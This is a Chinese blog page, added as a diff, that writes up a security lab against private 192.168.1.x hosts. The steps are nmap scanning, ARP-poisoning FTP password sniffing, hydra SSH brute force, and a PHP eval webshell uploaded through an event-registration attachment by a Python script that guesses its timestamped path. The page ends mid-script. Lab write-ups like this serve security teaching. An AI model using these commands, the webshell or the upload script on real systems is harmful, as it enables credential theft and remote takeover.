@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="zh_CN">
+    <head>
+    <meta charset="utf-8">
+
+    
+
+    <!-- 渲染优化 -->
+    <meta name="renderer" content="webkit">
+    <meta name="force-rendering" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="HandheldFriendly" content="True" >
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <!--icon-->
+
+    
+    
+    
+    
+    
+
+
+    <!-- meta -->
+
+
+<title>网络安全网络侦察实验 | Severus&#39; Blog Site</title>
+
+
+    <meta name="keywords" content="网络安全">
+
+
+
+
+    <!-- OpenGraph -->
+ 
+    <meta name="description" content="使用nmap、ettercap进行网络侦查和密码嗅探使用nmap工具进行网络侦察在Kali linux操作系统中打开操作终端，并使用nmap命令扫描192.168.1.0网段的存活主机，并探测该网段存活主机的开放端口、服务、操作系统及版本信息。 nmap 192.168.1.0&#x2F;24 -O -v  获得三台主机的信息：   分别扫描出了其端口信息、操作系统和版本信息。 使用ettercap工具进行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网络安全网络侦察实验">
+<meta property="og:url" content="https://severuszh.github.io/SeverusBlog/2024/09/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/index.html">
+<meta property="og:site_name" content="Severus&#39; Blog Site">
+<meta property="og:description" content="使用nmap、ettercap进行网络侦查和密码嗅探使用nmap工具进行网络侦察在Kali linux操作系统中打开操作终端，并使用nmap命令扫描192.168.1.0网段的存活主机，并探测该网段存活主机的开放端口、服务、操作系统及版本信息。 nmap 192.168.1.0&#x2F;24 -O -v  获得三台主机的信息：   分别扫描出了其端口信息、操作系统和版本信息。 使用ettercap工具进行">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712801493232.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712801556347.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712801572978.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712802924745.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712803175165.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712806592053.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712807164409.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712806836746.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712813043168.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712814371571.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712814480806.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712814635787.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712814673998.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712816929035.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712818096295.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712817428681.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712823934902.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712825897228.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712825970677.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712826367936.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712826451478.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712826849062.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712826945541.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712827538407.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712827477168.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712827600415.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712827647200.png">
+<meta property="og:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712827706875.png">
+<meta property="article:published_time" content="2024-09-09T19:27:28.000Z">
+<meta property="article:modified_time" content="2024-09-09T19:37:34.769Z">
+<meta property="article:author" content="Severus">
+<meta property="article:tag" content="网络安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://severuszh.github.io/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712801493232.png">
+
+
+    
+<link rel="stylesheet" href="/SeverusBlog/css/style/main.css">
+ 
+
+    
+    
+    
+
+    
+    
+<link rel="stylesheet" href="/SeverusBlog/css/style/dark.css">
+
+    
+<script src="/SeverusBlog/js/darkmode.js"></script>
+
+
+
+     
+
+    <!-- custom head -->
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+    <body>
+        <div id="app" tabindex="-1">
+            <header class="header">
+    <div class="header__left">
+        <a href="/SeverusBlog/" class="button">
+            <span class="logo__text">Severus的个人小站</span>
+        </a>
+    </div>
+    <div class="header__right">
+        
+            <div class="navbar__menus">
+                
+                    <a href="/SeverusBlog/" class="navbar-menu button">首页</a>
+                
+                    <a href="/SeverusBlog/tags/" class="navbar-menu button">标签</a>
+                
+                    <a href="/SeverusBlog/archives/" class="navbar-menu button">归档</a>
+                
+                    <a target="_blank" rel="noopener" href="https://github.com/SeverusZh" class="navbar-menu button">Github</a>
+                
+            </div>
+        
+        
+        
+    <a href="/SeverusBlog/search/" id="btn-search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="24" height="24" fill="currentColor" stroke="currentColor" stroke-width="32"><path d="M192 448c0-141.152 114.848-256 256-256s256 114.848 256 256-114.848 256-256 256-256-114.848-256-256z m710.624 409.376l-206.88-206.88A318.784 318.784 0 0 0 768 448c0-176.736-143.264-320-320-320S128 271.264 128 448s143.264 320 320 320a318.784 318.784 0 0 0 202.496-72.256l206.88 206.88 45.248-45.248z"></path></svg>
+    </a>
+
+
+        
+        
+    <a href="javaScript:void(0);" id="btn-toggle-dark">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+    </a>
+
+
+        
+            <a class="dropdown-icon button" id="btn-dropdown" tabindex="0"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width='24' height='24' fill="none" stroke="currentColor" stroke-width="0.7" stroke-linecap="round" stroke-linejoin="round"><path fill="currentColor" d="M3.314,4.8h13.372c0.41,0,0.743-0.333,0.743-0.743c0-0.41-0.333-0.743-0.743-0.743H3.314c-0.41,0-0.743,0.333-0.743,0.743C2.571,4.467,2.904,4.8,3.314,4.8z M16.686,15.2H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,15.2,16.686,15.2z M16.686,9.257H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,9.257,16.686,9.257z"></path></svg></a>
+            <div class="dropdown-menus" id="dropdown-menus">
+                
+                    <a href="/SeverusBlog/" class="dropdown-menu button">首页</a>
+                
+                    <a href="/SeverusBlog/tags/" class="dropdown-menu button">标签</a>
+                
+                    <a href="/SeverusBlog/archives/" class="dropdown-menu button">归档</a>
+                
+                    <a target="_blank" rel="noopener" href="https://github.com/SeverusZh" class="dropdown-menu button">Github</a>
+                
+            </div>
+        
+    </div>
+</header>
+
+
+            <main class="main">
+    
+
+<div class="post-title">
+    <h1 class="post-title__text">
+        网络安全网络侦察实验
+    </h1>
+    <div class="post-title__meta">
+        <a href="/SeverusBlog/archives/2024/09/" class="post-meta__date button">2024-09-10</a>
+        
+ 
+        
+    
+    
+
+
+ 
+
+ 
+    </div>
+</div>
+
+
+    <aside class="post-side">
+        <div class="post-side__toc">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8nmap%E3%80%81ettercap%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E4%BE%A6%E6%9F%A5%E5%92%8C%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2"><span class="toc-number">1.</span> <span class="toc-text">使用nmap、ettercap进行网络侦查和密码嗅探</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8nmap%E5%B7%A5%E5%85%B7%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F"><span class="toc-number">1.1.</span> <span class="toc-text">使用nmap工具进行网络侦察</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8ettercap%E5%B7%A5%E5%85%B7%E8%BF%9B%E8%A1%8C%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2"><span class="toc-number">1.2.</span> <span class="toc-text">使用ettercap工具进行密码嗅探</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8crunch%E3%80%81hydra%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3ssh%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.</span> <span class="toc-text">使用crunch、hydra暴力破解ssh服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8crunch%E5%B7%A5%E5%85%B7%E7%94%9F%E6%88%90%E5%AF%86%E9%92%A5"><span class="toc-number">2.1.</span> <span class="toc-text">使用crunch工具生成密钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8hydra%E7%88%86%E7%A0%B4ssh"><span class="toc-number">2.2.</span> <span class="toc-text">使用hydra爆破ssh</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8ssh%E7%99%BB%E5%BD%95%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%B9%B6%E8%8E%B7%E5%8F%96key%E5%80%BC%EF%BC%8C%E8%8E%B7%E5%BE%97%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">3.</span> <span class="toc-text">使用ssh登录目标机并获取key值，获得敏感信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E7%BD%91%E7%AB%99%E7%9A%84webshell%E6%9D%83%E9%99%90%EF%BC%8C%E6%8E%A7%E5%88%B6%E7%9B%AE%E6%A0%87%E6%9C%BA%EF%BC%8C%E8%8E%B7%E5%BE%97%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">4.</span> <span class="toc-text">获取目标网站的webshell权限，控制目标机，获得敏感信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E5%B9%B6%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="toc-number">4.1.</span> <span class="toc-text">远程连接并查看文件内容</span></a></li></ol></li></ol>
+        </div>
+    </aside>
+    <a class="btn-toc button" id="btn-toc" tabindex="0">
+        <svg viewBox="0 0 1024 1024" width="32" height="32" xmlns="http://www.w3.org/2000/svg">
+            <path d="M128 256h64V192H128zM320 256h576V192H320zM128 544h64v-64H128zM320 544h576v-64H320zM128 832h64v-64H128zM320 832h576v-64H320z" fill="currentColor"></path>
+        </svg>
+    </a>
+    <div class="toc-menus" id="toc-menus">
+        <div class="toc-title">文章目录</div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8nmap%E3%80%81ettercap%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E4%BE%A6%E6%9F%A5%E5%92%8C%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2"><span class="toc-number">1.</span> <span class="toc-text">使用nmap、ettercap进行网络侦查和密码嗅探</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8nmap%E5%B7%A5%E5%85%B7%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F"><span class="toc-number">1.1.</span> <span class="toc-text">使用nmap工具进行网络侦察</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8ettercap%E5%B7%A5%E5%85%B7%E8%BF%9B%E8%A1%8C%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2"><span class="toc-number">1.2.</span> <span class="toc-text">使用ettercap工具进行密码嗅探</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8crunch%E3%80%81hydra%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3ssh%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.</span> <span class="toc-text">使用crunch、hydra暴力破解ssh服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8crunch%E5%B7%A5%E5%85%B7%E7%94%9F%E6%88%90%E5%AF%86%E9%92%A5"><span class="toc-number">2.1.</span> <span class="toc-text">使用crunch工具生成密钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8hydra%E7%88%86%E7%A0%B4ssh"><span class="toc-number">2.2.</span> <span class="toc-text">使用hydra爆破ssh</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8ssh%E7%99%BB%E5%BD%95%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%B9%B6%E8%8E%B7%E5%8F%96key%E5%80%BC%EF%BC%8C%E8%8E%B7%E5%BE%97%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">3.</span> <span class="toc-text">使用ssh登录目标机并获取key值，获得敏感信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E7%BD%91%E7%AB%99%E7%9A%84webshell%E6%9D%83%E9%99%90%EF%BC%8C%E6%8E%A7%E5%88%B6%E7%9B%AE%E6%A0%87%E6%9C%BA%EF%BC%8C%E8%8E%B7%E5%BE%97%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">4.</span> <span class="toc-text">获取目标网站的webshell权限，控制目标机，获得敏感信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E5%B9%B6%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="toc-number">4.1.</span> <span class="toc-text">远程连接并查看文件内容</span></a></li></ol></li></ol>
+    </div>
+
+
+<article class="post post__with-toc content-card">
+    <div class="post__header"></div>
+    <div class="post__content">
+        <h2 id="使用nmap、ettercap进行网络侦查和密码嗅探"><a href="#使用nmap、ettercap进行网络侦查和密码嗅探" class="headerlink" title="使用nmap、ettercap进行网络侦查和密码嗅探"></a>使用nmap、ettercap进行网络侦查和密码嗅探</h2><h3 id="使用nmap工具进行网络侦察"><a href="#使用nmap工具进行网络侦察" class="headerlink" title="使用nmap工具进行网络侦察"></a>使用nmap工具进行网络侦察</h3><p>在Kali linux操作系统中打开操作终端，并使用nmap命令扫描192.168.1.0网段的存活主机，并探测该网段存活主机的开放端口、服务、操作系统及版本信息。</p>
+<pre><code class="apache">nmap 192.168.1.0/24 -O -v
+</code></pre>
+<p>获得三台主机的信息：<br><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712801493232.png" alt="1712801493232"></p>
+<p><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712801556347.png" alt="1712801556347"></p>
+<p><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712801572978.png" alt="1712801572978"></p>
+<p>分别扫描出了其端口信息、操作系统和版本信息。</p>
+<h3 id="使用ettercap工具进行密码嗅探"><a href="#使用ettercap工具进行密码嗅探" class="headerlink" title="使用ettercap工具进行密码嗅探"></a>使用ettercap工具进行密码嗅探</h3><p>使用嗅探工具对目标机的vsftpd服务进行嗅探。通过设置监听网卡、主机、开启arp欺骗、启动嗅探等步骤来嗅探网络内的数据包，获取ftp用户名和密码</p>
+<p>在kali系统中打开ettercap的图形界面：</p>
+<p><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712802924745.png" alt="1712802924745"></p>
+<p>设置嗅探网卡：<code>eth0 有线网卡</code></p>
+<p><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712803175165.png" alt="1712803175165"></p>
+<p>选择工具栏 <code>Hosts-Host lists</code>，并且使用 <code>Scan for hosts</code>来找出指定网段内的所有存活主机，并将其加入目标：</p>
+<p><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712806592053.png" alt="1712806592053"></p>
+<p>检查ip_forward是否为1，若不为1则需修改。</p>
+<p><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712807164409.png" alt="1712807164409"></p>
+<p>开始攻击，攻击方法为 <code>ARP Poisoning</code></p>
+<p><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712806836746.png" alt="1712806836746"></p>
+<p>得到ftp的密码：ftp123<br><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712813043168.png" alt="1712813043168"></p>
+<h2 id="使用crunch、hydra暴力破解ssh服务"><a href="#使用crunch、hydra暴力破解ssh服务" class="headerlink" title="使用crunch、hydra暴力破解ssh服务"></a>使用crunch、hydra暴力破解ssh服务</h2><h3 id="使用crunch工具生成密钥"><a href="#使用crunch工具生成密钥" class="headerlink" title="使用crunch工具生成密钥"></a>使用crunch工具生成密钥</h3><p>在操作机使用相关工具，要求从字符串“hacker +123456”中，随机选9个字符进行排列组合，生成密码字典文件password.txt。</p>
+<pre><code class="apache">crunch  9 9 123456 -t hacker%%%  -o password.txt
+</code></pre>
+<p><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712814371571.png" alt="1712814371571"></p>
+<h3 id="使用hydra爆破ssh"><a href="#使用hydra爆破ssh" class="headerlink" title="使用hydra爆破ssh"></a>使用hydra爆破ssh</h3><pre><code class="apache">hydra -l hacker -P password.txt 192.168.1.3 ssh
+</code></pre>
+<p><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712814480806.png" alt="1712814480806"></p>
+<p>得到密码hacker123</p>
+<h2 id="使用ssh登录目标机并获取key值，获得敏感信息"><a href="#使用ssh登录目标机并获取key值，获得敏感信息" class="headerlink" title="使用ssh登录目标机并获取key值，获得敏感信息"></a>使用ssh登录目标机并获取key值，获得敏感信息</h2><pre><code class="apache">ssh [用户名]@[IP地址]
+ssh hacker@192.168.1.3
+</code></pre>
+<p><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712814635787.png" alt="1712814635787"></p>
+<p><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712814673998.png" alt="1712814673998"></p>
+<p>1.key中内容是ettercap。</p>
+<h2 id="获取目标网站的webshell权限，控制目标机，获得敏感信息"><a href="#获取目标网站的webshell权限，控制目标机，获得敏感信息" class="headerlink" title="获取目标网站的webshell权限，控制目标机，获得敏感信息"></a>获取目标网站的webshell权限，控制目标机，获得敏感信息</h2><p>在操作机创建脚本，建立一个上传表单；建立一个php文件，作为一句话木马。通过上传表单上传一句话。</p>
+<p>该网站网址是 <code>http://192.168.1.4/index.php</code></p>
+<p><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712816929035.png" alt="1712816929035"></p>
+<p>我们选择这样的一句话木马：</p>
+<pre><code class="apache">&lt;?php eval($_GET[&#39;cmd&#39;]); ?&gt;
+</code></pre>
+<p>其意义为执行GET请求中cmd的参数</p>
+<p>我们将这这个一句话木马保存到 <code>webshell.php</code>中。</p>
+<p><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712818096295.png" alt="1712818096295"></p>
+<p>在浏览器另外一个页面快速打开 <code>http://192.168.1.4/index.php?module=eventregistration&amp;action=eventsCalendar</code>，获得时间戳，分析可知上传的文件名以时间戳+下划线+原文件名称来命名。</p>
+<p><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712817428681.png" alt="1712817428681"></p>
+<p>我们选择用python编写脚本</p>
+<pre><code class="python">import  requests
+import re
+
+dir_url = &quot;http://192.168.1.4&quot;
+tmp_url = f&quot;&#123;dir_url&#125;/tmp&quot;
+base_url = f&quot;&#123;dir_url&#125;/index.php&quot;
+upload_url = f&quot;&#123;base_url&#125;?module=eventregistration&amp;action=emailRegistrants&amp;action=emailRegistrants&amp;email_addresses=123456789@123.com&amp;email_message=1&amp;email_subject=1&quot;
+timestamp_url = f&quot;&#123;base_url&#125;?module=eventregistration&amp;action=eventsCalendar&quot;
+webshell_path = &quot;/Desktop/webshell.php&quot;
+
+def upload_file():
+    files = &#123;
+        &quot;attach&quot;: open(webshell_path,&quot;rb&quot;),
+        &quot;filename&quot;:webshell_path
+    &#125;
+
+    requests.post(url = upload_url, files= files)
+
+def get_timestamp():
+    res = requests.get(url=timestamp_url)
+    if res.status_code != 200:
+        raise  requests.exceptions.ConnectionError(f&quot;Connection with &#123;timestamp_url&#125; failed&quot;)
+    else:
+        return int(re.search(&quot;History\\.push.+?rel:\\&#39;(\d+)?\\&#39;&quot;,res.text).group(1))
+
+def find_webshell_url(timestamp, max_number =10000):
+    for i in range(max_number):
+        test_url = f&quot;&#123;tmp_url&#125;/&#123;timestamp-i&#125;_&#123;webshell_path&#125;&quot;
+        res =requests.get(url=test_url)
+        if res.status_code == 200:
+            return test_url
+
+    return &quot;&quot;
+
+if __name__ == &quot;__main__&quot;:
+    upload_file()
+
+    timestamp = get_timestamp()
+    print(f&quot;current timestamp: &#123;timestamp&#125;&quot;)
+
+    webshell_url = find_webshell_url(timestamp)
+    if webshell_url:
+        print(f&quot;webshell url: &#123;webshell_url&#125;&quot;)
+    else:
